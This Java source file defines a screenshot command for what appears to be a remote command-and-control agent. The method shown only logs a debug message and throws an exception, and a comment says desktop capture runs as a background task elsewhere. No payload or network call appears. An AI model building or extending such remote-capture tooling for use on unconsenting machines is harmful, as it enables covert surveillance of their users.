package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;

/**
 * Screenshot task - captures desktop and sends as download
 * This is a background task that runs asynchronously
 * Windows/Linux/macOS
 */
public class ScreenshotTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing screenshot command");
        
        // This should never actually be called - screenshot is handled as a background task
        // The Agent detects screenshot commands and starts the background task directly
        throw new Exception("Screenshot must be run as background task");
    }
    
    @Override
    public String getCommandName() {
        return "screenshot";
    }
}
